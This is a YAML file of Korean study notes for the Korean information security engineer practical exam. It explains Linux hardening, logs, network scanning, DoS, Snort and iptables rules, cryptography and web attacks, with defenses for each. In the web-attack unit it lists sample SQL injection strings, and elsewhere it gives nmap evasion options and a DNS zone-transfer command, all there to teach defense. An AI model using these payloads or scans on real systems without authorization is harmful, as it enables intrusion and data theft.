# 정보보안기사 실기 — 단원별 설명(읽는 순서: 설명 → 핵심 정리 → 연습문제). 직접 작성한 해설입니다.
notes_for: eis
notes:
  eis-01:
    - h: "이 단원에서 묻는 것"
      p:
        - "실기에서는 파일 내용을 보여 주고 '무엇이 문제인가, 어떻게 고치는가'를 쓰게 합니다. /etc/passwd 한 줄, ls -l 결과 한 줄을 보고 필드와 권한을 바로 읽을 수 있어야 합니다."
        - "권한 숫자는 '특수 권한 1자리 + 소유자·그룹·기타 3자리'로 읽습니다. 4755 는 SUID 가 붙은 755, 1777 은 Sticky bit 가 붙은 777 입니다. ls -l 에서 소유자 실행 자리가 s 이면 SUID, 기타 실행 자리가 t 이면 Sticky bit 입니다."
    - h: "읽는 법 예시"
      code: |
        root:x:0:0:root:/root:/bin/bash
         ①   ② ③ ④  ⑤    ⑥      ⑦
        ① 계정  ② 암호(x = shadow 에 저장)  ③ UID  ④ GID  ⑤ 설명  ⑥ 홈  ⑦ 로그인 셸

        -rwsr-xr-x 1 root root 54256 /usr/bin/passwd   → SUID(4755): 실행하는 동안 root 권한
        drwxrwxrwt 9 root root  4096 /tmp              → Sticky bit(1777): 소유자만 삭제 가능
      p:
        - "답안 요령: '로그인할 필요가 없는 계정의 셸은 /sbin/nologin 또는 /bin/false 로 바꾼다', 'root 외 UID 0 계정은 삭제하거나 UID 를 바꾼다'처럼 문제점과 조치를 한 쌍으로 씁니다."
    - h: "/etc/shadow 는 아홉 칸을 센다"
      code: |
        user:$6$salt$hash:19700:1:90:7:30:19900:
          ①      ②        ③  ④ ⑤ ⑥ ⑦   ⑧   ⑨
        ① 계정 ② 암호화된 비밀번호 ③ 마지막 변경일(1970-01-01 부터의 일수)
        ④ 최소 사용일 ⑤ 최대 사용일 ⑥ 경고일 ⑦ 비활성 유예일 ⑧ 계정 만료일 ⑨ 예약

        ② 자리의 $N$ 은 해시 방식:  $1$ MD5   $5$ SHA-256   $6$ SHA-512
        ② 가 비어 있으면 비밀번호 없이 로그인 가능 → 즉시 잠가야 할 취약점
        ② 가 * 또는 ! 로 시작하면 잠긴 계정
      p:
        - "'비밀번호를 90일마다 바꾸도록 설정하시오' 같은 문제는 ⑤ 최대 사용일을 고치는 것이고, 명령으로는 chage -M 90 user 입니다. 전체 기본값은 /etc/login.defs 의 PASS_MAX_DAYS 에서 정합니다."
    - h: "계정 점검 명령 모음"
      code: |
        awk -F: '$3==0 {print $1}' /etc/passwd     UID 0 계정 찾기(root 외에 있으면 취약)
        awk -F: '$2==""  {print $1}' /etc/shadow   비밀번호 없는 계정 찾기
        find / -perm -4000 -type f 2>/dev/null     SUID 파일 찾기
        find / -perm -2000 -type f 2>/dev/null     SGID 파일 찾기
        chmod -s /path/file                        불필요한 SUID 제거
        usermod -s /sbin/nologin user              셸 제거
        passwd -l user                             계정 잠금
      p:
        - "실기에서 '불필요한 SUID 를 찾아 제거하는 명령을 쓰시오'가 그대로 나옵니다. find 의 -perm -4000 과 chmod -s 를 세트로 외우세요."
        - "umask 는 '기본 권한에서 뺄 값'입니다. 파일 기본 666, 디렉터리 기본 777 에서 umask 를 뺍니다. umask 022 면 파일 644, 디렉터리 755 입니다. 보안 강화 값으로 027 또는 077 을 권고합니다."

  eis-02:
    - h: "로그 파일은 '누가 무엇을 기록하나'로 외운다"
      p:
        - "utmp·wtmp·btmp·lastlog 는 사람이 읽을 수 없는 이진 파일이라 각각 전용 명령(who, last, lastb, lastlog)으로 봅니다. 시험은 '어떤 명령으로 무엇을 확인하는가'를 빈칸으로 자주 냅니다."
        - "침해 사고 분석 순서로 기억하면 쉽습니다. 누가 지금 들어와 있나(who) → 언제 들어왔나(last) → 실패한 시도는(lastb) → root 로 전환했나(sulog) → 무슨 명령을 실행했나(history, lastcomm)."
    - h: "로그 파일 한 장 정리"
      code: |
        파일               내용                       보는 명령
        /var/run/utmp      현재 로그인 중인 사용자      who, w, finger
        /var/log/wtmp      로그인·로그아웃 성공 이력    last
        /var/log/btmp      로그인 실패 이력            lastb
        /var/log/lastlog   계정별 마지막 로그인        lastlog
        /var/log/secure    인증·권한 관련(su, sshd)    cat, grep
        /var/log/messages  시스템 전반                 cat, tail -f
        /var/log/cron      크론 실행 기록              cat
        /var/log/maillog   메일 송수신                 cat
        ~/.bash_history    사용자가 친 명령            cat
      p:
        - "데비안·우분투 계열은 secure 대신 /var/log/auth.log, messages 대신 /var/log/syslog 를 씁니다. 문제에 배포판이 나오면 맞춰 답하세요."
    - h: "cron 과 syslog 한 줄 읽기"
      code: |
        30 4 * * 1-5 /usr/local/bin/check.sh     → 평일(월~금) 04:30 에 실행
        분 시 일 월 요일

        0 */6 * * *   → 6시간마다(0시, 6시, 12시, 18시)
        */10 * * * *  → 10분마다

        authpriv.*      /var/log/secure          → 인증 관련 모든 수준을 secure 에 기록
        *.emerg         *                        → 긴급 메시지는 로그인한 모든 사용자에게
        *.info;mail.none;authpriv.none  /var/log/messages  → info 이상, 단 mail·authpriv 는 제외
      p:
        - "syslog 수준은 낮을수록 위급합니다. emerg(0) → alert → crit → err → warning → notice → info → debug(7). '*.err' 은 err 이상(더 위급한 것 포함)을 뜻합니다."
    - h: "로그 위변조 방지"
      p:
        - "공격자가 가장 먼저 하는 일이 로그 삭제입니다. 그래서 원격 로그 서버로 실시간 전송(syslog 의 @주소 또는 @@주소), 로그 파일에 append-only 속성 부여(chattr +a), 무결성 검사 도구(AIDE, Tripwire) 사용을 대응으로 씁니다."
        - "'로그 서버로 전송하는 설정을 쓰시오' → /etc/rsyslog.conf 에 `*.*  @@192.168.1.10:514` (@ 는 UDP, @@ 는 TCP)."

  eis-03:
    - h: "공격 원리 → 조건 → 대응 순으로 쓴다"
      p:
        - "서술형은 '원리를 설명하고 대응 방안을 쓰시오' 형태가 많습니다. 버퍼 오버플로우라면 '입력 길이를 검사하지 않아 버퍼를 넘친 데이터가 복귀 주소를 덮어쓴다 → 공격자가 원하는 코드 주소로 실행 흐름이 바뀐다 → 길이를 제한하는 함수 사용, 스택 가드, ASLR, DEP' 순서로 적습니다."
        - "대응은 '개발 단계(안전한 함수, 입력 검증)'와 '운영 단계(ASLR, DEP, 패치)'로 나눠 쓰면 빠뜨리지 않습니다."
    - h: "메모리 공격 3종 비교"
      code: |
        스택 버퍼 오버플로  지역 변수 버퍼를 넘쳐 복귀 주소(RET)를 덮어씀
                           → 스택 가드(카나리), ASLR, DEP/NX, strncpy·snprintf
        힙 오버플로        동적 할당 영역의 관리 구조를 덮어써 포인터를 조작
                           → 힙 무결성 검사, 안전한 할당자
        포맷 스트링        printf(buf) 처럼 사용자 입력을 서식으로 사용
                           → printf("%s", buf) 로 고정 서식 사용

        안전하지 않은 함수 → 대체 함수
          strcpy  → strncpy        strcat → strncat
          sprintf → snprintf       gets   → fgets
      p:
        - "'다음 코드의 취약점과 안전한 함수를 쓰시오'가 단골입니다. strcpy 가 보이면 거의 버퍼 오버플로우입니다."
    - h: "권한 상승과 백도어"
      p:
        - "레이스 컨디션(경쟁 조건)은 '검사한 뒤 사용하기 전에 대상이 바뀌는' 문제입니다. SUID 프로그램이 임시 파일을 만들 때 공격자가 그 사이에 심볼릭 링크를 걸어 중요한 파일을 덮어쓰게 만듭니다. 대응은 O_EXCL 로 배타적 생성, mkstemp 사용, 심볼릭 링크 검사입니다."
        - "루트킷은 커널이나 시스템 명령을 바꿔치기해 자신을 숨깁니다. ps·netstat 가 정상으로 보여도 실제로는 숨겨진 프로세스가 있을 수 있으므로, 신뢰할 수 있는 매체의 명령이나 chkrootkit·rkhunter 로 점검합니다."
    - h: "자주 나오는 점검 명령"
      code: |
        netstat -antp | grep LISTEN     열린 포트와 그 프로세스
        ss -antp                         (최신 배포판)
        ps -ef --forest                  프로세스 부모-자식 관계
        lsof -i                          네트워크를 쓰는 프로세스
        lsof -p PID                      그 프로세스가 연 파일
        find / -mtime -1 -type f         최근 하루 내 변경된 파일

  eis-04:
    - h: "스캔은 '열린 포트와 닫힌 포트의 응답 차이'가 전부"
      p:
        - "모든 스캔 문제는 표 하나로 정리됩니다. TCP 규칙상 닫힌 포트는 RST 로 답하고, 열린 포트는 SYN 에만 SYN+ACK 로 답하며 그 밖의 이상한 플래그는 무시합니다. 그래서 FIN·NULL·Xmas 스캔은 '응답 없음 = 열림'입니다."
      code: |
        스캔        보내는 것        열림           닫힘
        SYN(-sS)    SYN              SYN+ACK        RST+ACK
        FIN/NULL/Xmas  FIN / 없음 / FIN+PSH+URG   응답 없음   RST
        UDP(-sU)    UDP              응답 없음      ICMP Port Unreachable
        ACK(-sA)    ACK              (방화벽 필터링 여부만 확인: RST 가 오면 필터링 없음)
    - h: "TCP 3-way handshake 와 플래그"
      code: |
        클라이언트            서버
            │  ── SYN ──────▶  │   연결 요청 (seq=x)
            │  ◀ SYN+ACK ───   │   수락 (seq=y, ack=x+1)
            │  ── ACK ──────▶  │   확인 (ack=y+1)  → 연결 수립(ESTABLISHED)

        플래그: SYN(연결 요청) ACK(확인) FIN(정상 종료) RST(강제 종료)
                PSH(즉시 전달) URG(긴급)

        정상 종료는 4-way: FIN → ACK → FIN → ACK
      p:
        - "상태 값도 묻습니다. SYN 플러딩을 맞으면 SYN_RECEIVED 상태가 쌓이고, 정상 연결은 ESTABLISHED, 종료 중에는 TIME_WAIT 가 남습니다."
    - h: "nmap 옵션"
      code: |
        nmap -sS -p 1-1024 10.1.1.0/24     SYN 스캔(반열림), 1~1024 포트
        nmap -sT                            TCP 연결 스캔(3-way 완성 → 로그에 남음)
        nmap -sU                            UDP 스캔
        nmap -sV                            서비스 버전 확인(배너)
        nmap -O                             운영체제 추정
        nmap -sn                            호스트만 탐색(핑 스캔)
        nmap -f                             패킷을 조각내 IDS 우회 시도
      p:
        - "-sS 를 '스텔스 스캔'이라 부르는 이유는 3-way 를 완성하지 않아 서버 애플리케이션 로그에 접속 기록이 남지 않기 때문입니다. 다만 방화벽·IDS 에서는 탐지됩니다."

  eis-05:
    - h: "DoS 는 '무엇을 고갈시키나'로 분류"
      p:
        - "대역폭 고갈(UDP·ICMP 플러딩, 증폭 공격), 연결 자원 고갈(SYN 플러딩 — 백로그 큐), 애플리케이션 자원 고갈(Slowloris, RUDY — 웹 서버 연결 수)로 나눕니다. 대응도 여기에 맞춰 달라집니다."
        - "이름이 비슷한 공격은 한 줄 특징으로 구분합니다. Land 는 출발지와 목적지가 같다, Smurf 는 브로드캐스트로 ICMP 응답을 증폭한다, Teardrop 은 조각 오프셋을 겹친다, Ping of Death 는 규격보다 큰 패킷이다."
    - h: "느린 HTTP 공격 3종 구분"
      code: |
        Slowloris        헤더를 끝내지 않음(빈 줄 미전송)      → 헤더 수신 타임아웃
        RUDY(Slow POST)  Content-Length 는 크게, 본문은 조금씩  → 본문 수신 타임아웃
        Slow Read        TCP 윈도우를 아주 작게 해 응답을 천천히 읽음 → 최소 전송 속도 제한
    - h: "증폭 공격은 '증폭률'이 핵심"
      code: |
        공격          악용 프로토콜   증폭률(대략)   대응
        DNS 증폭      DNS(53/UDP)     약 50배        개방형 리졸버 차단(recursion no)
        NTP 증폭      NTP(123/UDP)    약 500배       monlist 비활성화, 버전 업그레이드
        Memcached     11211/UDP       수만 배        UDP 비활성화, 외부 노출 금지
        Smurf         ICMP 브로드캐스트              directed broadcast 차단
      p:
        - "증폭 공격의 공통 조건은 둘입니다. ① UDP 라서 출발지 IP 위조가 쉽다 ② 질의는 작고 응답은 크다. 그래서 대응도 '출발지 IP 위조 차단(ingress filtering)'과 '증폭에 쓰이는 서비스를 외부에 열지 않기'로 갈립니다."
    - h: "스푸핑·스니핑은 '무엇을 속이나'"
      code: |
        ARP 스푸핑    MAC 주소를 속임 → 같은 LAN 의 트래픽을 가로챔(중간자)
                      대응: 정적 ARP(arp -s), ARP 감시 도구, DAI(동적 ARP 검사)
        IP 스푸핑     출발지 IP 를 속임 → 신뢰 관계 악용, DoS 은폐
                      대응: ingress/egress 필터링, r 계열 서비스 제거
        DNS 스푸핑    질의 응답을 먼저 보내 가짜 주소로 유도
                      대응: DNSSEC, 신뢰할 수 있는 DNS 사용
        세션 하이재킹 수립된 세션의 시퀀스 번호를 추측해 가로챔
                      대응: 암호화(SSH, TLS), 세션 ID 재발급
      p:
        - "스니핑은 '엿듣기'라 수동적이고 탐지가 어렵습니다. 탐지법으로 ARP watch, 위조 MAC 으로 핑을 보내 응답하는지 보는 방법(프로미스큐어스 모드 탐지)을 씁니다. 근본 대응은 암호화입니다."

  eis-06:
    - h: "Snort 룰은 '헤더 + 옵션' 두 부분"
      p:
        - "헤더는 '무엇을 할지(alert) 어떤 트래픽에(프로토콜, 출발지 → 목적지)', 옵션은 괄호 안에 '무엇을 찾을지'를 씁니다. 방향 기호는 -> 와 <> 만 있습니다."
      code: |
        alert tcp any any -> 192.168.1.0/24 80 (msg:"passwd access"; content:"/etc/passwd"; nocase; sid:1000001;)
        └액션 └프로토콜 └출발지 IP·포트 └목적지 IP·포트   └옵션: 메시지, 찾을 문자열, 대소문자 무시, 룰 번호

        threshold:type threshold, track by_src, count 10, seconds 5;   → 같은 출발지에서 5초에 10번마다 알림
    - h: "Snort 옵션 자주 나오는 것"
      code: |
        msg       알림에 표시할 설명
        content   찾을 문자열("..." 또는 16진수 |00 FF|)
        nocase    대소문자 구분 안 함
        offset    검사 시작 위치      depth   검사 길이
        flags     TCP 플래그 (S=SYN, A=ACK, F=FIN, R=RST)
        flow      to_server, established 등 방향·상태
        sid       룰 고유 번호(1,000,000 이상이 사용자 정의)
        rev       룰 개정 번호
        classtype 분류    priority 우선순위

        액션: alert(경고+기록) log(기록만) pass(무시) drop(차단+기록, IPS 모드)
              reject(차단+RST 전송) sdrop(조용히 차단)
      p:
        - "'SYN 플러딩을 탐지하는 룰을 쓰시오' 같은 문제는 flags:S; 와 threshold 를 조합합니다. 빈칸 채우기로는 content 와 nocase 가 가장 많이 나옵니다."
    - h: "iptables 는 '체인 → 조건 → 동작'"
      code: |
        iptables -A INPUT -p tcp -s 10.0.0.0/8 --dport 22 -j ACCEPT   내부 대역의 SSH 허용
        iptables -A INPUT -p tcp --dport 22 -j DROP                    그 밖의 SSH 차단
        iptables -P INPUT DROP                                         기본 정책을 차단으로
        (규칙은 위에서부터 적용되므로 허용을 먼저, 차단을 나중에 쓴다)

        체인: INPUT(들어옴) OUTPUT(나감) FORWARD(통과)
              PREROUTING·POSTROUTING(NAT 테이블)
        동작: ACCEPT(허용) DROP(조용히 버림) REJECT(거부 응답) LOG(기록)

        iptables -L -n -v --line-numbers    규칙 보기
        iptables -D INPUT 3                 3번 규칙 삭제
        iptables -I INPUT 1 ...             맨 앞에 삽입
      p:
        - "DROP 과 REJECT 의 차이를 묻습니다. DROP 은 아무 응답도 하지 않아 공격자가 방화벽 존재를 알기 어렵고(스캔이 느려짐), REJECT 는 ICMP 거부 메시지를 보내 응답이 빠르지만 방화벽이 있음을 알려 줍니다."
    - h: "IDS·IPS·방화벽·WAF 구분"
      code: |
        방화벽   IP·포트 기준 접근 통제(3~4계층). 통과/차단만 결정
        IDS      침입 탐지. 미러링된 트래픽을 보고 경고만(사후)
        IPS      침입 차단. 인라인으로 지나가며 실시간 차단(사전)
        WAF      웹 전용(7계층). SQL 삽입·XSS 같은 웹 공격 탐지·차단
        UTM      방화벽+IPS+안티바이러스+VPN 등을 한 장비에
      p:
        - "오탐(False Positive)은 정상을 공격으로 본 것, 미탐(False Negative)은 공격을 놓친 것입니다. 보안에서는 미탐이 더 위험하지만, 오탐이 많으면 운영자가 경고를 무시하게 되어 결국 미탐으로 이어집니다."

  eis-07:
    - h: "IPsec 은 2×2 표로 정리"
      code: |
        구분       전송 모드(Transport)          터널 모드(Tunnel)
        AH         원래 IP 헤더 + AH + 데이터      새 IP 헤더 + AH + 원래 패킷 전체
        ESP        원래 IP 헤더 + ESP + 데이터     새 IP 헤더 + ESP + 원래 패킷 전체
        용도       호스트 ↔ 호스트               게이트웨이 ↔ 게이트웨이(VPN)
        AH = 인증·무결성만 / ESP = 암호화 + 인증
      p:
        - "'AH 는 기밀성을 제공하지 않는다'가 자주 나오는 함정입니다. 암호화가 필요하면 ESP 입니다. NAT 환경에서는 AH 가 IP 헤더까지 인증하므로 통과하지 못하고, ESP 에 NAT-T 를 적용합니다."
        - "IKE 는 IPsec 의 키 교환 프로토콜입니다. 1단계에서 ISAKMP SA 를 만들고(메인 모드 6개 메시지 또는 어그레시브 모드 3개), 2단계에서 실제 데이터용 IPsec SA 를 만듭니다."
    - h: "TLS 에서 두 종류의 키가 쓰이는 단계"
      p:
        - "핸드셰이크 단계에서는 비대칭키(서버 인증서의 공개키, 키 교환)로 상대를 인증하고 세션 키를 안전하게 합의합니다. 그 뒤 실제 데이터는 합의한 대칭키(세션 키)로 암호화합니다. 비대칭키는 느리지만 키 분배 문제가 없고, 대칭키는 빠르기 때문에 둘을 섞어 씁니다."
      code: |
        클라이언트                          서버
          ── Client Hello ───────────────▶   지원 암호 목록, 랜덤값
          ◀── Server Hello ──────────────    선택한 암호, 랜덤값
          ◀── Certificate ───────────────    서버 인증서(공개키 포함)
          ── Client Key Exchange ────────▶   프리마스터 시크릿(서버 공개키로 암호화)
          ── Change Cipher Spec, Finished ▶
          ◀── Change Cipher Spec, Finished
          ══ 이후 데이터는 세션 키(대칭키)로 암호화 ══
      p:
        - "전방향 안전성(PFS)은 서버 개인키가 나중에 유출돼도 과거 통신을 풀 수 없게 하는 성질입니다. DHE·ECDHE 키 교환을 쓰면 세션마다 임시 키를 만들어 PFS 가 보장됩니다."
    - h: "무선랜 보안 세대"
      code: |
        WEP     RC4 + 24비트 IV. IV 재사용으로 쉽게 깨짐 → 사용 금지
        WPA     TKIP(WEP 하드웨어 호환용 임시 대책)
        WPA2    CCMP/AES. 현재 기본. KRACK 취약점 보고됨
        WPA3    SAE(개인), 192비트(기업). 오프라인 사전 공격 방어

        개인용(PSK)은 공유 비밀번호, 기업용(Enterprise)은 802.1X + RADIUS 로 계정별 인증
      p:
        - "무선 공격은 이름으로 구분합니다. Rogue AP(허가되지 않은 AP 설치), Evil Twin(정상 AP 와 같은 SSID 로 유인), WPS PIN 공격, 디어소시에이션(연결 해제 프레임으로 재접속 유도 후 핸드셰이크 수집)."

  eis-08:
    - h: "웹 공격은 '어디서 실행되나'로 구분"
      p:
        - "SQL 삽입은 DB 서버에서, XSS 는 피해자의 브라우저에서, CSRF 는 피해자의 권한으로 서버에서, 파일 업로드(웹셸)는 웹 서버에서 실행됩니다. 실행 위치를 알면 대응도 따라 나옵니다."
        - "쿠키는 브라우저에 저장되어 사용자가 고칠 수 있고, 세션은 서버에 저장되고 브라우저에는 세션 ID 만 둡니다. 그래서 인증 정보는 세션에 두고, 세션 ID 쿠키에는 Secure·HttpOnly·SameSite 속성을 붙입니다."
    - h: "SQL 삽입 유형과 실제 문자열"
      code: |
        인증 우회      ' OR '1'='1' --        → WHERE id='' OR '1'='1' -- '
        UNION 기반     ' UNION SELECT user,password FROM users --
        에러 기반      에러 메시지에 DB 정보가 노출되는 것을 이용
        블라인드       참/거짓에 따른 응답 차이로 한 글자씩 추출
                       ' AND SUBSTRING(password,1,1)='a' --
        시간 기반      ' AND SLEEP(5) --      응답 지연으로 참/거짓 판단

        대응: PreparedStatement(질의 구조와 데이터 분리), 최소 권한 DB 계정,
              상세 에러 메시지 숨김, 저장 프로시저, 입력 검증
      p:
        - "'다음 입력이 들어갔을 때 실행되는 SQL 을 쓰고 대응을 설명하시오'가 전형입니다. 주석 기호(-- , #, /* */)가 뒤의 따옴표를 무력화한다는 점을 설명에 꼭 넣으세요."
    - h: "XSS 세 가지"
      code: |
        Stored(저장형)     게시판 등에 저장되어 보는 사람마다 실행 — 피해 범위 가장 큼
        Reflected(반사형)  요청 값이 응답에 그대로 반영 — 링크를 클릭하게 유도
        DOM 기반           서버를 거치지 않고 브라우저의 스크립트가 DOM 을 조작

        대응: 입력 검증 + 출력 시 컨텍스트별 인코딩(&lt; &gt; &quot; &#39;),
              HttpOnly 쿠키(스크립트가 쿠키를 읽지 못하게), CSP 헤더
      p:
        - "XSS 로 세션 쿠키를 훔치는 코드가 자주 제시됩니다. document.cookie 를 외부로 보내는 형태이고, HttpOnly 속성이 이것을 막는다는 점이 답입니다."
    - h: "CSRF 토큰이 막는 원리"
      p:
        - "서버가 폼을 내려줄 때 예측할 수 없는 토큰을 세션에 저장하고 폼에도 넣습니다. 요청이 오면 두 값을 비교합니다. 공격자가 만든 페이지는 이 토큰을 알 수 없으므로 위조 요청은 거부됩니다."
        - "XSS 와 CSRF 의 차이를 묻는 문제가 많습니다. XSS 는 '사용자를 믿는 서버가 악성 스크립트를 내보내는' 문제이고, CSRF 는 '사용자를 믿는 서버가 위조된 요청을 받아들이는' 문제입니다. CSRF 는 응답 내용을 볼 수 없고 요청만 보냅니다."
    - h: "보안 헤더와 파일 업로드"
      code: |
        X-Frame-Options: DENY                  클릭재킹 방지(iframe 삽입 금지)
        X-Content-Type-Options: nosniff        MIME 스니핑 방지
        Content-Security-Policy: script-src 'self'   XSS 완화
        Strict-Transport-Security: max-age=31536000  HTTPS 강제
        Set-Cookie: ...; Secure; HttpOnly; SameSite=Strict

        파일 업로드 대응 4종
          ① 확장자 화이트리스트(블랙리스트 금지)  ② 업로드 폴더 실행 권한 제거
          ③ 웹 루트 밖에 저장 후 다운로드 스크립트로 제공  ④ 파일명 난수화, 용량 제한

  eis-09:
    - h: "메일 인증 3종은 '무엇을 검증하나'"
      code: |
        SPF     이 메일을 보낸 서버 IP 가 그 도메인이 허락한 서버인가   (DNS TXT 에 허용 IP 등록)
        DKIM    메일 내용이 발신 도메인의 개인키로 서명되었는가           (DNS TXT 에 공개키 등록)
        DMARC   SPF·DKIM 이 실패하면 어떻게 처리할 것인가               (none / quarantine / reject + 보고)
      p:
        - "FTP 는 '데이터 연결을 누가 여는가'만 기억합니다. Active 는 서버(20번)가 클라이언트로, Passive 는 클라이언트가 서버의 임의 포트로 엽니다. 방화벽 뒤 클라이언트는 Passive 를 씁니다."
    - h: "DNS 보안 — 설정 파일과 공격"
      code: |
        /etc/named.conf 주요 설정
          allow-transfer { 10.1.1.2; };   영역 전송을 보조 DNS 에만 허용(기본은 전체 허용 = 취약)
          recursion no;                    외부 질의에 재귀 응답 금지(DNS 증폭 악용 차단)
          version "unknown";               버전 숨김

        공격
          영역 전송(Zone Transfer) 취약점  dig @서버 도메인 axfr 로 전체 레코드 수집
          캐시 포이즈닝                     가짜 응답을 먼저 보내 캐시를 오염
          DNS 증폭                          위조된 출발지로 큰 응답을 피해자에게
        대응: DNSSEC(응답에 전자서명), 재귀 질의 제한, 응답 속도 제한(RRL)
      p:
        - "'allow-transfer 를 설정하지 않으면 어떤 문제가 생기는가'가 그대로 나옵니다. 답은 '누구나 영역 전송을 요청해 내부 호스트 목록 전체를 얻을 수 있다'입니다."
    - h: "메일 서비스 설정"
      code: |
        /etc/mail/sendmail.cf   PrivacyOptions=goaway,restrictqrun  (VRFY·EXPN 차단)
        /etc/mail/access        릴레이 허용 목록 → makemap hash access < access 로 access.db 생성
        /etc/aliases            별칭. decode·uudecode 별칭은 제거

        스팸 릴레이 취약점: 아무나 이 서버를 거쳐 메일을 보낼 수 있는 상태
          → access 에 내부 대역만 RELAY 로 등록하고 나머지는 REJECT
      p:
        - "VRFY 와 EXPN 은 계정 존재 여부를 확인해 주는 명령이라 계정 수집에 악용됩니다. 둘을 막는 설정을 쓰라는 문제가 나옵니다."

  eis-10:
    - h: "어떤 키로 무엇을 하는가"
      code: |
        기밀성(암호화)   수신자의 공개키로 암호화 → 수신자의 개인키로 복호화
        전자서명         송신자의 개인키로 서명   → 송신자의 공개키로 검증
        키 분배          대칭키(세션 키)를 수신자의 공개키로 암호화해 전달
      p:
        - "해시·MAC·전자서명은 제공하는 서비스로 구분합니다. 해시는 무결성만, MAC 은 무결성과 인증(키를 공유한 상대), 전자서명은 무결성·인증·부인 방지까지 제공합니다."
    - h: "알고리즘 분류표"
      code: |
        대칭키 블록   DES(64/56) 3DES AES(128/192/256) SEED ARIA(국산) IDEA
        대칭키 스트림 RC4, A5
        운영 모드     ECB(같은 평문→같은 암호문, 취약) CBC(이전 블록과 XOR, IV 필요)
                      CFB CTR(병렬 처리 가능) GCM(암호화+인증 동시)
        비대칭키      RSA(소인수분해) ECC(타원곡선, 짧은 키로 같은 강도)
                      Diffie-Hellman(키 교환) ElGamal DSA(서명 전용)
        해시          MD5(128, 깨짐) SHA-1(160, 깨짐) SHA-256/512 HAS-160(국산)
      p:
        - "ECB 모드가 취약한 이유를 그림으로 묻는 문제가 있습니다. 같은 평문 블록이 항상 같은 암호문이 되어 원본의 패턴이 그대로 드러납니다. 실무에서는 CBC 이상, 가능하면 GCM 을 씁니다."
        - "키 개수 계산도 나옵니다. n 명이 대칭키로 통신하려면 n(n-1)/2 개, 공개키 방식은 2n 개가 필요합니다."
    - h: "PKI 구성과 인증서"
      code: |
        CA(인증기관)    인증서 발급·폐기          RA(등록기관)  신원 확인 대행
        CRL             폐기 목록(주기적 배포)     OCSP          실시간 폐기 여부 질의
        X.509 인증서 항목: 버전, 일련번호, 서명 알고리즘, 발급자, 유효기간,
                           주체, 주체 공개키, 확장 필드, CA 의 서명
      p:
        - "인증서 검증 과정을 쓰라는 문제: ① 유효기간 확인 ② 발급자(CA) 체인을 루트까지 따라가며 서명 검증 ③ 폐기 여부 확인(CRL/OCSP) ④ 주체 이름이 접속한 도메인과 일치하는지 확인."
    - h: "비밀번호 저장"
      p:
        - "비밀번호는 암호화가 아니라 해시로 저장합니다. 단순 해시는 레인보우 테이블에 당하므로 계정마다 다른 솔트를 붙이고, 의도적으로 느린 알고리즘(bcrypt, scrypt, Argon2, PBKDF2)을 씁니다."
        - "'솔트를 쓰는 이유'를 묻는 문제의 답은 두 가지입니다. ① 같은 비밀번호라도 해시값이 달라져 레인보우 테이블을 무력화 ② 같은 비밀번호를 쓴 계정을 알아볼 수 없게 함."

  eis-11:
    - h: "보안 모델은 방향을 뒤집어 외운다"
      p:
        - "BLP 는 비밀이 아래로 새는 것을 막으므로 '위로 읽지 못하고 아래로 쓰지 못한다'. Biba 는 더러운 데이터가 위로 올라오는 것을 막으므로 정반대인 '아래를 읽지 못하고 위로 쓰지 못한다'입니다."
        - "커버로스 흐름: 사용자가 AS 에서 TGT 를 받는다 → TGT 로 TGS 에서 서비스 티켓을 받는다 → 서비스 티켓으로 서버에 접속한다. 비밀번호는 네트워크로 전송되지 않습니다."
      code: |
        BLP (기밀성)   No Read Up   / No Write Down   (단순 보안 규칙 / *-속성)
        Biba (무결성)  No Read Down / No Write Up
        Clark-Wilson   잘 구성된 트랜잭션, 임무 분리 — 상용 무결성
        만리장성(BN)   이해 충돌 방지 — 접근 이력에 따라 접근 가능 범위가 달라짐
    - h: "접근 통제 3종과 인증 3요소"
      code: |
        DAC   자원 소유자가 권한 부여(유닉스 파일 권한) — 유연하지만 통제 약함
        MAC   관리자가 보안 등급으로 강제(SELinux, 군사) — 강하지만 경직
        RBAC  역할에 권한을 부여하고 사용자에게 역할 할당 — 조직 운영에 적합

        인증 3요소: 지식(아는 것: 비밀번호) 소유(가진 것: OTP·스마트카드)
                    존재(자신: 지문·홍채) [+ 행위: 서명·걸음걸이]
        2단계 인증은 서로 다른 요소를 둘 조합해야 한다(비밀번호 2개는 2요소가 아님)
      p:
        - "생체 인증 지표도 나옵니다. FAR(타인 수용률)은 남을 본인으로 잘못 받아들이는 비율, FRR(본인 거부율)은 본인을 거부하는 비율, EER 은 둘이 같아지는 지점으로 작을수록 좋은 시스템입니다. 보안이 중요하면 FAR 을 낮춥니다."
    - h: "SSO 와 연합 인증"
      p:
        - "커버로스는 사내 네트워크용 SSO 이고, SAML 과 OAuth·OIDC 는 웹·클라우드용입니다. SAML 은 인증 정보를 XML 로 주고받는 연합 인증, OAuth 2.0 은 '인가(권한 위임)' 프로토콜이고 그 위에 인증을 얹은 것이 OpenID Connect 입니다."
        - "'OAuth 는 인증 프로토콜이다'는 틀린 설명입니다. OAuth 자체는 자원 접근 권한을 위임하는 인가 프로토콜입니다."

  eis-12:
    - h: "사고 대응 답안의 뼈대"
      p:
        - "'탐지 → 초기 대응(격리, 증거 보존) → 원인 조사 → 복구 → 재발 방지'의 흐름으로 씁니다. 증거를 다룰 때는 원본을 보존하고 사본으로 분석하며, 해시값으로 무결성을 증명하고, 인수인계 기록(연계 보관성)을 남긴다고 적습니다."
      code: |
        침해사고 대응 7단계(표준)
        ① 사고 전 준비 ② 사고 탐지 ③ 초기 대응 ④ 대응 전략 체계화
        ⑤ 사고 조사 ⑥ 보고서 작성 ⑦ 해결(복구·재발 방지)
    - h: "악성코드 분류"
      code: |
        바이러스   숙주 파일에 기생, 사용자 실행으로 전파
        웜         스스로 복제·전파, 네트워크 취약점 이용
        트로이목마 정상 프로그램으로 위장, 자가 복제 없음
        랜섬웨어   파일을 암호화하고 금전 요구
        루트킷     시스템 깊숙이 숨어 탐지를 회피
        백도어     인증을 우회하는 비밀 통로
        APT        특정 대상을 장기간 은밀히 노리는 지속적 공격

        APT 단계: 침투(사회공학·제로데이) → 거점 확보 → 권한 상승
                  → 내부 확산(측면 이동) → 정보 수집 → 유출 → 흔적 제거
      p:
        - "랜섬웨어 대응은 '예방·탐지·복구'로 나눠 씁니다. 예방은 백업(3-2-1 원칙)과 패치·메일 첨부 차단, 탐지는 비정상 파일 변경 감시, 복구는 오프라인 백업 복원입니다. 몸값 지불은 권장되지 않습니다."
    - h: "실무형 분석 순서"
      p:
